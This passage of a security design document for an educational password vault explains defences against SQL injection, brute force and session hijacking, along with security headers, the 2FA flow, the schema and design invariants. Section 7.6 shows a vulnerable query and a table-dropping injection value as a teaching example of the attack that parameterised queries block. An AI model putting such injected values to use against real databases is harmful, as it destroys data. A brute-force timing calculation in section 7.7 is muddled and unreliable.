
---

### 7.6 — SQL Injection

**What is it?**
An attacker crafts input that, when inserted into a SQL query by string concatenation, changes the query's meaning to execute arbitrary database commands.

**Example of a vulnerable query:**
```python
# DANGEROUS — never do this:
db.execute(f"SELECT * FROM vault_entries WHERE title = '{user_input}'")
# If user_input = "'; DROP TABLE vault_entries; --"
# The query becomes: SELECT * FROM vault_entries WHERE title = ''; DROP TABLE...
```

**How we block it — SQLAlchemy ORM with parameterised queries:**
We never write raw SQL. Every database operation goes through SQLAlchemy's ORM layer:
```python
db.query(VaultEntry).filter(VaultEntry.user_id == user_id)
```
SQLAlchemy compiles this to parameterised SQL: `SELECT ... WHERE user_id = ?` and passes `user_id` as a separate parameter. The database driver ensures the parameter is treated as a data value, never as SQL code — no matter what it contains.

---

### 7.7 — Brute-Force / Password Guessing

**What is it?**
An automated script tries thousands of passwords against the `/login` endpoint to find the correct one.

**How we block it — two layers:**

**Layer 1 — Argon2id's intentional slowness:**
Argon2id is deliberately slow (~200ms per verification). An attacker trying 1,000 passwords per second against a CPU-bound hash would need to wait 200 seconds per attempt on our system. They can only try ~5 passwords per second against Argon2id (limited by server CPU + RAM). At that rate, a dictionary of 10,000 common passwords takes 33 minutes — and that's assuming no lockout.

**Layer 2 — Rate limiting with IP lockout:**
`LoginRateLimitMiddleware` tracks failed login attempts per IP address. After a configurable number of failures, the IP is locked out for a cooldown period. The response includes a `Retry-After` header.

**Timing attack defence:**
Even when no user exists in the database, the login code runs Argon2id against a pre-computed dummy hash. This ensures the response time for "no user" and "wrong password" are identical — an attacker cannot determine whether a vault exists by measuring response times.

---

### 7.8 — Session Hijacking

**What is it?**
An attacker steals a valid session cookie and uses it to access the app as the authenticated user — bypassing login entirely.

**How we block it — layered defences:**

| Defence | What it blocks |
|---|---|
| `HttpOnly` cookie | JavaScript cannot read the cookie, so XSS attacks cannot steal it |
| `Secure` cookie | Cookie is only sent over HTTPS — cannot be intercepted over plain HTTP |
| `SameSite=strict` | Cookie is not sent on cross-site requests — CSRF cannot carry the session |
| Fernet encryption | Even if the cookie value is captured, it reveals nothing without SECRET_KEY |
| Fernet TTL | Captured cookies expire automatically after `SESSION_TIMEOUT_MINUTES` |
| Session-fixation protection | `session.clear()` is called at the START of login before writing new keys, so a session planted before login cannot be carried forward |
| `Cache-Control: no-store` | Browsers don't cache authenticated pages — a shared computer's Back button cannot reveal vault content after logout |

---

## 8. Security Headers Explained

These four headers are stamped on every response by `CSPMiddleware`. Here is what each one does in plain English.

### Content Security Policy (CSP)

CSP is a browser directive delivered as an HTTP header that acts as a whitelist: it tells the browser exactly which sources of content are allowed to load and run on the page. The browser enforces this — any resource not on the whitelist is silently blocked.

Our policy (simplified):
```
script-src 'self'         — Only run JavaScript loaded from our own server.
                            Inline <script> tags are blocked.
                            External JS from any CDN is blocked.
style-src 'self'          — Only load CSS from our own server.
img-src 'self' data:      — Images from our server or data: URIs (for QR codes).
default-src 'none'        — Everything else (fonts, frames, etc.) is blocked.
```

**Why we self-host Tailwind CSS:**
If we loaded Tailwind from a CDN (`<script src="https://cdn.tailwindcss.com">`), our CSP would need to allow that CDN as a trusted source. That means if the CDN is ever compromised and serves malicious code, our app would execute it. By self-hosting Tailwind in `app/static/`, our CSP can be `script-src 'self'` — we trust only our own files.

### X-Frame-Options: DENY

Prevents the app from being embedded in any `<iframe>` or `<frame>` on any other website. Blocks clickjacking attacks (Section 7.3).

### X-Content-Type-Options: nosniff

Tells the browser to trust the `Content-Type` header and never try to guess (sniff) the content type. Prevents MIME-type confusion attacks where malicious content disguised as a safe file type gets executed (Section 7.4).

### Strict-Transport-Security (HSTS)

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```
Tells the browser to use HTTPS exclusively for this domain for one year. Also applies to subdomains (`includeSubDomains`). Only effective in production — where HTTPS is actually available.

---

## 9. Two-Factor Authentication State Machine

Two-Factor Authentication (2FA) adds a second verification step after the password check. We use TOTP — Time-based One-Time Password. TOTP generates a 6-digit code that changes every 30 seconds, derived from a shared secret and the current time. The user's authenticator app (Google Authenticator, Authy, etc.) generates the same code as our server using the same algorithm.

The 2FA flow introduces a "mid-login" session state — the user has passed the password check but hasn't yet verified their TOTP code. `AuthGuard` grants vault access only when `session["encryption_key"]` is present, never when only `session["pending_user_id"]` is set.

### Full login state machine

```
                         POST /login
                              │
                    ┌─────────▼──────────┐
                    │  Verify password    │
                    │  (Argon2id hash)    │
                    └─────────┬──────────┘
                              │ password correct
                    ┌─────────▼──────────┐
                    │  Derive vault key   │
                    │  (Argon2id KDF)     │
                    └─────────┬──────────┘
                              │
                   ┌──────────▼───────────┐
                   │  user.totp_enabled?  │
                   └──────────┬───────────┘
                              │
               ┌──────────────┴──────────────┐
          2FA  │                             │ 2FA
       disabled│                        enabled│
               ▼                             ▼
   ┌─────────────────────┐     ┌──────────────────────────┐
   │  Write full session │     │  Write PENDING session   │
   │  encryption_key ✓   │     │  pending_user_id ✓        │
   │  user_id ✓          │     │  pending_encryption_key ✓ │
   └──────────┬──────────┘     │  (no encryption_key yet) │
              │                └────────────┬─────────────┘
              ▼                             │
          /vault                            ▼
      (authenticated)             GET /2fa/verify
                                  POST /2fa/verify
                                          │
                         ┌────────────────┼──────────────────┐
                    TOTP │          wrong │             max 5 │
                      OK │           code │            wrong  │
                         ▼                ▼            codes  ▼
             ┌───────────────────┐  ┌────────────┐  ┌──────────────────┐
             │ Promote session   │  │ Increment  │  │ Wipe session     │
             │ pending_* removed │  │ attempt    │  │ Flash error msg  │
             │ encryption_key ✓  │  │ counter    │  │ Redirect /login  │
             │ user_id ✓         │  │ Show error │  └──────────────────┘
             └─────────┬─────────┘  └────────────┘
                       │
                       ▼
                   /vault
               (authenticated)

Alternative path: "Use a recovery code" link on /2fa/verify
                                  │
                                  ▼
                         POST /2fa/recovery
                                  │
                  ┌───────────────┼──────────────────┐
             code │        no match│           max 5  │
            valid │               │          attempts │
                  ▼               ▼                   ▼
       ┌──────────────────┐  ┌────────────┐  ┌──────────────────┐
       │ Mark code used   │  │ Increment  │  │ Wipe session     │
       │ used_at = now()  │  │ attempt    │  │ Redirect /login  │
       │ Promote session  │  │ counter    │  └──────────────────┘
       │ encryption_key ✓ │  │ Show error │
       └────────┬─────────┘  └────────────┘
                │
                ▼
            /vault
        (authenticated)
```

### Session keys at each stage

| Login stage | Keys in session |
|---|---|
| Not logged in (fresh visit) | `{}` empty, or `{"csrf_token": "..."}` only |
| Mid-login (TOTP required) | `pending_user_id`, `pending_encryption_key`, `totp_attempts` |
| Fully authenticated | `encryption_key`, `user_id`, `csrf_token` |

`AuthGuard` checks for `encryption_key`. The `pending_*` keys alone never grant vault access.

### TOTP secret storage

The TOTP shared secret is itself sensitive — if an attacker learns it, they can generate valid codes indefinitely. We treat it like a vault credential:
- Generated as a Base32 string by `pyotp.random_base32()`
- AES-256-GCM encrypted with the user's vault key before being stored in `users.totp_secret`
- Decrypted in memory only when needed for TOTP verification
- Never logged

### Recovery codes

8 single-use recovery codes are generated at 2FA setup. They allow access if the user loses their authenticator app.
- Generated as random URL-safe strings: `secrets.token_urlsafe(10)`
- Shown to the user once, in plaintext, at setup
- **Argon2id-hashed** before being stored in `recovery_codes.code_hash` — same reasoning as password hashing
- Marked with `used_at` timestamp when consumed — each code can only be used once

---

## 10. Database Schema

### Entity-Relationship Diagram

```
┌──────────────────────────────────────────────┐
│                    users                      │
├──────────────────────────────────────────────┤
│ id            INTEGER   PRIMARY KEY           │
│ password_hash TEXT      NOT NULL              │◄── Argon2id PHC string
│                                               │    (for login verification only)
│ kdf_salt      TEXT      NOT NULL   UNIQUE     │◄── 32-byte random salt (base64)
│                                               │    (for vault key derivation)
│ totp_secret   TEXT      NULL                  │◄── AES-256-GCM encrypted TOTP secret
│                                               │    NULL = 2FA disabled
│ totp_enabled  BOOLEAN   NOT NULL   default=0  │
│ created_at    DATETIME  NOT NULL              │
│ updated_at    DATETIME  NOT NULL              │
└──────────────┬────────────────────────────────┘
               │ 1
               │ ON DELETE CASCADE
               │ (deleting a user deletes all their entries and codes)
       ┌───────┴────────────────────────────────────────────────────┐
       │                     vault_entries                           │
       ├────────────────────────────────────────────────────────────┤
       │ id                 INTEGER   PRIMARY KEY                    │
       │ user_id            INTEGER   FK → users.id   INDEXED       │
       │                                                             │
       │ ── Plaintext columns (safe to store unencrypted) ────────  │
       │ title              TEXT      NOT NULL                       │
       │ website            TEXT      NULL                           │
       │ category           TEXT      NULL                           │
       │                                                             │
       │ ── Encrypted columns (stored as base64 tokens) ──────────  │
       │ encryption_version TEXT      NOT NULL   default="fernet"   │◄── "fernet" (legacy)
       │                                                             │    or "aesgcm" (current)
       │ username_encrypted TEXT      NOT NULL                       │◄── AES-256-GCM or Fernet token
       │ password_encrypted TEXT      NOT NULL                       │◄── AES-256-GCM or Fernet token
       │ notes_encrypted    TEXT      NULL                           │◄── NULL if no notes
       │                                                             │
       │ created_at         DATETIME  NOT NULL                       │
       │ updated_at         DATETIME  NOT NULL                       │
       └────────────────────────────────────────────────────────────┘

       ┌────────────────────────────────────────────────────────────┐
       │                    recovery_codes                           │
       ├────────────────────────────────────────────────────────────┤
       │ id        INTEGER   PRIMARY KEY                             │
       │ user_id   INTEGER   FK → users.id   INDEXED               │
       │ code_hash TEXT      NOT NULL                               │◄── Argon2id hash of the code
       │ used_at   DATETIME  NULL                                   │◄── NULL = available
       └────────────────────────────────────────────────────────────┘    timestamp = consumed (single use)
```

### Key design decisions

**`kdf_salt` is UNIQUE:**
If two users shared the same salt and the same password, they would derive the same encryption key. That would be a catastrophic data isolation failure. The UNIQUE constraint on the column prevents this at the database level.

**`encryption_version` per row (not per table):**
Upgrading from Fernet to AES-256-GCM happens lazily — rows are upgraded one at a time as they are read. During the upgrade window, the table contains a mix of old and new versions. A per-row version column handles this gracefully. A single table-wide flag would require a risky bulk re-encryption.

**`user_id` is indexed on both `vault_entries` and `recovery_codes`:**
Every query filters `WHERE user_id = ?`. Without an index, SQLite reads every row to find matches (full table scan = O(n)). With a B-tree index, SQLite jumps directly to the matching rows (O(log n)). This matters most during import operations that touch many rows.

**WAL mode (Write-Ahead Logging):**
WAL is a SQLite journal mode. In default mode, a write locks the file — readers must wait. In WAL mode, readers can read the last committed snapshot while a write is in progress. This is configured via a SQLAlchemy `event.listen("connect")` pragma hook and is relevant during bulk imports that create many entries while the dashboard might be polling.

**Recovery codes are Argon2id-hashed:**
A plaintext recovery code in the database would be a single SQL query away from bypassing 2FA. We apply the same Argon2id hashing to recovery codes as we do to passwords. Brute-forcing the hash requires the same computational work as cracking a password.

---

## 11. Module Map

```
app/
│
├── main.py               App factory: creates the FastAPI instance, registers
│                         all five middleware layers in the correct order, includes
│                         routers, adds global 404/500 error handlers, configures
│                         app.log and audit.log with rotating file handlers.
│
├── config/
│   └── settings.py       Pydantic BaseSettings — reads environment variables
│                         (SECRET_KEY, ENVIRONMENT, SESSION_TIMEOUT_MINUTES,
│                         DATABASE_URL) from the .env file or OS environment.
│                         Raises a startup error if SECRET_KEY is missing.
│
├── database/
│   ├── base.py           SQLAlchemy DeclarativeBase. All ORM models inherit Base.
│   └── session.py        Creates the SQLAlchemy engine and SessionLocal factory.
│                         get_db() is a FastAPI dependency that yields a DB session
│                         and closes it when the request finishes.
│                         Registers the WAL-mode PRAGMA via event.listen("connect").
│
├── middleware/
│   ├── auth_guard.py     Reads session["encryption_key"]. If absent on a
│   │                     non-exempt path → 302 to /login. If present →
│   │                     sets Cache-Control: no-store on the response.
│   │                     Exempt paths: /login, /setup, /2fa/*, /auth/timeout-notify,
│   │                     /static/*.
│   │
│   ├── csrf.py           Synchronizer-token CSRF protection. On GET: generates
│   │                     token if absent, stores in session, injects into
│   │                     request.state. On POST/PUT/DELETE: validates form token
│   │                     vs. session token; 403 on mismatch; 303 on session-expiry
│   │                     race (session lost between GET and POST).
│   │
│   ├── csp.py            Stamps four security headers on every outgoing response:
│   │                     Content-Security-Policy, X-Frame-Options,
│   │                     X-Content-Type-Options, Strict-Transport-Security.
│   │
│   ├── rate_limit.py     Per-IP login failure counter in an in-memory dict.
│   │                     After threshold failures → 429 + Retry-After header.
│   │                     Resets on successful login. Resets on server restart.
│   │
│   └── encrypted_session.py  Replaces Starlette's default SessionMiddleware.
│                             Fernet-encrypts the session dict into a cookie
│                             using a key derived from SECRET_KEY via HKDF-SHA256.
│                             Enforces Fernet TTL (SESSION_TIMEOUT_MINUTES).
│
├── models/
│   ├── user.py           User ORM model: id, password_hash, kdf_salt,
│   │                     totp_secret, totp_enabled, created_at, updated_at.
│   │                     Relationships: vault_entries and recovery_codes with
│   │                     cascade="all, delete-orphan".
│   │
│   ├── vault_entry.py    VaultEntry ORM model: plaintext (title, website,
│   │                     category) + encrypted (username_encrypted,
│   │                     password_encrypted, notes_encrypted) + encryption_version.
│   │
│   └── recovery_code.py  RecoveryCode ORM model: user_id FK, code_hash,
│                         used_at (NULL = available; timestamp = consumed).
│
├── schemas/
│   ├── auth.py           Pydantic schemas for request validation:
│   │                     LoginRequest (non-empty password),
│   │                     SetupRequest (password + confirm, min 8 chars, must match).
│   │
│   └── vault.py          VaultEntryCreate (title + password required),
│                         VaultEntryUpdate (all optional for partial updates),
│                         VaultEntryResponse (all fields decrypted, returned to routes).
│
├── routes/
│   ├── auth.py           Thin route handlers (validate input → call service → respond):
│   │                     GET/POST /setup, GET/POST /login, POST /logout,
│   │                     GET/POST /2fa/setup, POST /2fa/disable,
│   │                     GET/POST /2fa/verify, GET/POST /2fa/recovery,
│   │                     GET /auth/timeout-notify.
│   │
│   └── vault.py          GET /vault, GET/POST /entry/new,
│                         GET /entry/{id}, GET/POST /entry/{id}/edit,
│                         POST /entry/{id}/delete,
│                         POST /vault/import, GET /vault/export.
│
├── services/
│   ├── auth_service.py   All authentication business logic:
│   │                     setup_vault() — hash password, generate KDF salt, create User row.
│   │                     login() — verify password, derive key, write session.
│   │                     logout() — clear session.
│   │                     enable_2fa() — verify TOTP code, encrypt+store secret, generate recovery codes.
│   │                     disable_2fa() — clear TOTP secret and recovery codes.
│   │
│   ├── vault_service.py  All vault CRUD with transparent field-level encryption:
│   │                     get_entries(), get_entry() — decrypt on read.
│   │                     create_entry() — encrypt on write.
│   │                     update_entry() — encrypt changed fields on write.
│   │                     delete_entry() — encrypted tokens deleted with the row.
│   │                     _decrypt_entry() — internal; handles lazy Fernet→GCM upgrade.
│   │
│   └── import_export.py  parse_keepass_xml(), parse_lastpass_csv() — parse uploaded files.
│                         build_keepass_xml(), build_lastpass_csv() — serialize for download.
│                         Entries are encrypted by vault_service after parsing.
│
├── security/
│   ├── encryption.py     The cryptographic core:
│   │                     generate_kdf_salt() — os.urandom(32) as base64.
│   │                     derive_key() — Argon2id KDF via hash_secret_raw().
│   │                     encrypt_field() / decrypt_field() — Fernet (legacy read).
│   │                     encrypt_field_gcm() / decrypt_field_gcm() — AES-256-GCM.
│   │                     get_cipher(version, key) — returns (encrypt_fn, decrypt_fn).
│   │
│   ├── hashing.py        Wraps argon2-cffi PasswordHasher:
│   │                     hash_password() — produces Argon2id PHC string.
│   │                     verify_password() — constant-time comparison.
│   │                     needs_rehash() — True if stored hash uses outdated parameters.
│   │
│   ├── totp.py           TOTP lifecycle:
│   │                     generate_secret() — pyotp.random_base32().
│   │                     get_provisioning_uri() — otpauth:// URI for QR codes.
│   │                     verify_totp() — checks current and ±1 window code.
│   │                     generate_recovery_codes() — 8 × secrets.token_urlsafe(10).
│   │                     hash_recovery_code() / verify_recovery_code() — Argon2id.
│   │
│   └── audit.py          log_event(event, **fields) — emits a JSON record to the
│                         "securevault.audit" logger. Example:
│                         {"ts": "2024-06-06T14:32:01.123+00:00",
│                          "event": "login_success", "user_id": 1}
│
├── templates/            Jinja2 HTML templates, all extending base.html:
│                         vault.html, entry_form.html, entry_detail.html,
│                         login.html, setup.html,
│                         2fa_setup.html, 2fa_verify.html, 2fa_recovery.html.
│
├── static/
│   ├── css/              custom.css (app styles), dark.css (dark mode overrides),
│   │                     tailwind.min.js (self-hosted — keeps CSP strict).
│   │
│   └── js/               dark_mode.js — detects system preference, handles toggle.
│                         datetime.js — formats UTC timestamps in browser local time.
│                         entry_detail.js — copy-to-clipboard with 30s auto-clear.
│                         entry_form.js — password visibility toggle, strength meter.
│                         import_export.js — plaintext export warning prompt.
│                         password_generator.js — configurable local password generation.
│                         session_timeout.js — inactivity timer; fires /auth/timeout-notify
│                                             then redirects to /login.
│                         vault_search.js — client-side live search + category filter.
│
├── utils/
│   └── helpers.py        none_if_empty(v) — converts "" → None for optional form fields.
│                         first_validation_error(exc) — extracts human-readable message
│                             from a Pydantic ValidationError.
│                         format_datetime(dt) — formats datetime for display.
│                         truncate(s, n) — truncates a string to n chars for UI.
│                         utcnow() — timezone-aware UTC datetime for DB timestamps.
│
├── templates_config.py   Single shared Jinja2Templates instance. Registers
│                         format_datetime as a global function and truncate_str
│                         as a filter, available in all templates.
│
└── tests/                pytest test suite:
                          Unit: test_encryption.py, test_hashing.py, test_totp.py,
                                test_helpers.py, test_import_export.py.
                          Integration: test_auth_routes.py, test_vault_routes.py,
                                       test_vault_service.py, test_csp.py,
                                       test_rate_limit.py, test_encrypted_session.py.
                          Current coverage: 88% (fail_under=80 enforced in .coveragerc).
```

---

## 12. Security Decisions and Rationale

### Why Argon2id instead of bcrypt or PBKDF2?

All three are designed to be slow, but only Argon2id is **memory-hard**:

| Algorithm | GPU speedup | Why |
|---|---|---|
| PBKDF2 | ~10,000× | Pure CPU computation — GPUs parallelise cheaply |
| bcrypt | ~10-100× | Better, but still CPU-only |
| Argon2id | ~1-2× | Requires 64 MiB RAM per guess — GPUs have many cores but limited memory bandwidth |

An attacker with a $50,000 GPU cluster can try bcrypt at ~100M guesses/second but Argon2id only at ~10,000/second because memory bandwidth is the bottleneck, not compute cores.

### Why does the session store the encryption key instead of re-deriving it per request?

Argon2id is intentionally slow — ~200ms per derivation. If we re-derived the key on every HTTP request, the vault dashboard (which loads all entries) would take 200ms just for the key before even touching the database. Stored in the session, the key is available instantly after decrypting the cookie (~1ms). The trade-off is that the key persists in the session for the session duration — which is mitigated by the Fernet TTL and `session.clear()` on logout.

### Why are error messages identical for "no vault" and "wrong password"?

If "vault does not exist" produced a different response (different message, different response time, different status code), an attacker could probe `/login` to discover whether a vault has been set up. This is an information leak known as "user enumeration". Both paths run identical Argon2id computation and return the same message: "Invalid password."

### Why is there no "forgot master password" flow?

The vault encryption key is derived from the master password. If the password is lost, the key cannot be reconstructed — and therefore the vault entries cannot be decrypted. This is intentional. Any "password reset" mechanism would require either:
- Storing a copy of the encryption key somewhere (defeats the security model), or
- Having a secondary secret (introduces another attack vector)

For an educational single-user vault, the trade-off is accepted: strong security at the cost of no recovery if the master password is forgotten.

### Why are title, website, and category stored in plaintext?

These fields are used for server-side search: `WHERE title ILIKE '%github%'`. To search encrypted values, the server would need to decrypt every row before filtering — which is O(n) decryptions per search and doesn't scale. These fields are considered low-sensitivity metadata (knowing you have a "GitHub" entry is far less sensitive than knowing the password for it). The truly sensitive fields — username, password, notes — are always encrypted.

### Why `Cache-Control: no-store` on authenticated responses?

Modern browsers cache pages for performance. If an authenticated `/entry/{id}` page is cached, a subsequent user of the same browser (or the same user after logout) could press Back and see a cached copy of the page including the decrypted password — without triggering any server request and therefore bypassing the session check entirely. `no-store` instructs the browser to never write the response to any cache.

### Why is rate limiting inside CSRF instead of outside?

Consider the reverse: if rate limiting were outermost:
1. A bot sends 1000 rapid POST /login requests — all without a CSRF token.
2. The rate limiter sees 1000 failed attempts from that IP and locks it out.
3. The actual user on that IP is now locked out too — even though they never sent a wrong password.

With rate limiting inside CSRF, those CSRF-invalid requests get 403 from the CSRF layer and never reach the rate limiter. Only validated (genuine) login attempts count toward the failure counter.

---

## 13. Key Invariants — Never Violate

These rules are hardcoded into the security design. Breaking any of them creates a vulnerability.

| Invariant | Security consequence of breaking it |
|---|---|
| Never log the master password, derived key, or base64-encoded key | Log files persist to disk — logs containing the key = key at rest = vault readable without login |
| Never store the derived encryption key outside session memory | A key in the database = the vault can be decrypted by anyone with DB access |
| Never write plaintext username, password, or notes to the database | Defeats the entire purpose of field-level encryption |
| Never hardcode SECRET_KEY, salts, or passwords in source files | Source files end up in git history — treat git history as permanently public |
| Always call `session.clear()` at the start of login (not just at the end) | Without pre-login clear: a session planted before login (session fixation) could be elevated to authenticated status |
| Always call `session.clear()` on logout | Failing to clear leaves the encryption key in the cookie until TTL expiry |
| Always filter vault queries by BOTH `entry_id` AND `user_id` | Filtering only on `entry_id` allows an authenticated user to read any other user's entry by guessing IDs (insecure direct object reference) |
| Always use SQLAlchemy ORM — never raw SQL string interpolation | String interpolation in SQL = SQL injection vulnerability |
| Always return generic error messages to the browser | Detailed error messages (stack traces, query errors) reveal internal structure that helps attackers |
| Always generate a fresh random nonce per AES-256-GCM encryption call | Reusing a (key, nonce) pair in GCM leaks the authentication key and allows full plaintext recovery |
| Never send decrypted passwords, usernames, or notes to external APIs | Logged by third parties, subject to their privacy policies, and outside our security boundary |
